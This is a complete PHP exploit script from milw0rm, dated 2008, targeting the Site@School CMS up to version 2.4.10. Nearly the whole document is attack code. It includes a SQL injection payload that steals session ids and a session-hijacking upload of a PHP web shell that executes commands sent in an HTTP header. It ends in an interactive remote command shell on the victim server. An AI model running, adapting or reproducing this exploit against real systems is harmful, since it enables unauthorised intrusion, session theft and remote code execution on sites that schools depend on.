<html><head><title>Site@School <= 2.4.10 (fckeditor) Session Hijacking / File Upload Exploit</title></head><pre>&lt;?php

/*
	-------------------------------------------------------------------------
	Site@School &lt;= 2.4.10 (fckeditor) Session Hijacking / File Upload Exploit
	-------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://siteatschool.sourceforge.net/
	details..: works with magic_quotes_gpc = off (the bug isn't still patched: http://www.securityfocus.com/bid/27120)
	details..: works only with a specific server configuration (e.g. an Apache server with the mod_mime module installed)
	
	[-] vulnerable code in /starnet/editors/fckeditor/editor/filemanager/sas/browser.php
	
	63.	$query = &quot;SELECT config_value FROM $table_configuration WHERE config_key='sessioncode'&quot;;
	64.	if ($result = mysql_query($query))
	65.	{
	66.		$check_sessioncode = mysql_result($result, 0);
	67.		unset ($query);
	68.		unset ($result);
	69.	}
	70.	if ($_SESSION['sessioncode'] != $check_sessioncode)
	71.	{
	72.		//if we don't have a session present the login screen
	73.		Header(&quot;Location: ../../../../../index.php&quot;);
	74.		exit;
	75.	}
	
	[...]
	
	117.	if ($option == &quot;upload&quot;)
	118.	{
	119.		if (IsSet ($_FILES[&quot;new_file&quot;][&quot;name&quot;]))
	120.		{
	121.			$file_name = $_FILES[&quot;new_file&quot;][&quot;name&quot;];
	122.		}
	123.		if (IsSet ($_SESSION['opendir']))
	124.		{
	125.			$write_path = $_SESSION['user_media_path'] . &quot;/&quot; . $_SESSION['opendir'];
	126.			// moveupload the file to $write_path, function is in core/common.inc.php
	127.			$temp_file = $_FILES[&quot;new_file&quot;][&quot;tmp_name&quot;]; //this is temporary uploaded file.	
	128.			sas_move_uploaded_file($write_path, $file_name, $temp_file);
	129.		}
	130.		$opendir = $_SESSION['opendir']; //for returning to the directory were we came from	
	131.	}
	
	an attacker could be able to retrieve a valid session id using the SQL injection bug in /starnet/addons/slideshow_full.php
	(http://www.milw0rm.com/exploits/4832) and bypass checks at lines 70-75 to upload malicious files containing php code!
*/

error_reporting(0);
ini_set(&quot;default_socket_timeout&quot;,5);
set_time_limit(0);

define(STDIN, fopen(&quot;php://stdin&quot;, &quot;r&quot;));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print &quot;\n[-] No response from {$host}:80 Trying again...\n&quot;;
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function upload()
{
	global $host, $path, $sid;
	
	$file_ext = array(&quot;.fla&quot;, &quot;.swf&quot;, &quot;.rar&quot;, &quot;.zip&quot;, &quot;.xls&quot;, &quot;.csv&quot;);
	
	$packet  = &quot;GET {$path}starnet/editors/fckeditor/editor/filemanager/sas/images.php?opendir=gallery HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Cookie: PHPSESSID={$sid}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	
	http_send($host, $packet);
	
	foreach ($file_ext as $ext)
	{
		print &quot;\n[-] Trying to upload with {$ext} extension...&quot;;
		
		$payload  = &quot;--o0oOo0o\r\n&quot;;
		$payload .= &quot;Content-Disposition: form-data; name=\&quot;new_file\&quot;; filename=\&quot;test.php{$ext}\&quot;\r\n\r\n&quot;;
		$payload .= &quot;&lt;?php \${error_reporting(0)}.\${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?&gt;\r\n&quot;;
		$payload .= &quot;--o0oOo0o--\r\n&quot;;

		$packet  = &quot;POST {$path}starnet/editors/fckeditor/editor/filemanager/sas/browser.php?option=upload HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Cookie: PHPSESSID={$sid}\r\n&quot;;
		$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
		$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$packet .= $payload;

		if (preg_match(&quot;/File upload error/i&quot;, http_send($host, $packet))) die(&quot;\n[-] Upload failed!\n&quot;);
		
		$packet  = &quot;GET {$path}starnet/media/gallery/test.php{$ext} HTTP/1.0\r\n&quot;;
		$packet .= &quot;Host: {$host}\r\n&quot;;
		$packet .= &quot;Connection: close\r\n\r\n&quot;;
		$html    = http_send($host, $packet);
		
		if (!eregi(&quot;print&quot;, $html) and eregi(&quot;_code_&quot;, $html)) return $ext;
		
		sleep(1);
	}
	
	return false;
}

function get_sid()
{
	global $host, $path, $prefix;
	
	// thanks to rgod for giving to understand that this isn't blind injetion...r.i.p. my friend!
	$sql =  &quot;'/**/UNION/**/SELECT/**/CONCAT(CHAR(0xFF),ses_id,CHAR(0xFF),CHAR(0x27)),1,1/**/&quot; .
		&quot;FROM/**/{$prefix}_sessions/**/WHERE/**/ses_value/**/LIKE/**/'%sessioncode%'%23&quot;;

	$packet  = &quot;GET {$path}starnet/addons/slideshow_full.php?album_name={$sql} HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	$pieces = explode(chr(0xFF), http_send($host, $packet));
	return $pieces[1];
}

function check_target()
{
	global $host, $path, $prefix;
	
	print &quot;\n[-] Checking {$host}...&quot;;
	
	$packet  = &quot;GET {$path}starnet/addons/slideshow_full.php?album_name=%27 HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	
	if (preg_match(&quot;/FROM (.*)_m/&quot;, http_send($host, $packet), $match)) print &quot;vulnerable!\n&quot;;
	else die(&quot;not vulnerable!\n\n[-] Exploit failed...probably magic_quotes_gpc = on\n&quot;);
	
	$prefix = $match[1];
}

print &quot;\n+-----------------------------------------------------------------------+&quot;;
print &quot;\n| Site@School &lt;= 2.4.10 Session Hijacking / File Upload Exploit by EgiX |&quot;;
print &quot;\n+-----------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage...: php $argv[0] host path \n&quot;;
	print &quot;\nhost....: target server (ip/hostname)&quot;;
	print &quot;\npath....: path to sas directory\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

check_target();
$sid = get_sid();

if (empty($sid)) die(&quot;\n[-] Session id not found! Try later...\n&quot;);
else print &quot;\n[-] Hijacking with sid {$sid}\n&quot;;

if (!($ext = upload())) die(&quot;\n[-] Exploit failed...\n&quot;);
else print &quot;\n[-] Shell uploaded...starting it!\n&quot;;

while(1)
{
	print &quot;\nsas-shell# &quot;;
	$cmd = trim(fgets(STDIN));
	if ($cmd != &quot;exit&quot;)
	{
		$packet = &quot;GET {$path}starnet/media/gallery/test.php{$ext} HTTP/1.0\r\n&quot;;
		$packet.= &quot;Host: {$host}\r\n&quot;;
		$packet.= &quot;Cmd: &quot;.base64_encode($cmd).&quot;\r\n&quot;;
		$packet.= &quot;Connection: close\r\n\r\n&quot;;
		$output = http_send($host, $packet);
		if (!preg_match(&quot;/_code_/&quot;, $output)) die(&quot;\n[-] Exploit failed...\n&quot;);
		$shell  = explode(&quot;_code_&quot;, $output);
		print &quot;\n{$shell[1]}&quot;;
	}
	else break;
}

?&gt;

# milw0rm.com [2008-07-04]</pre></html>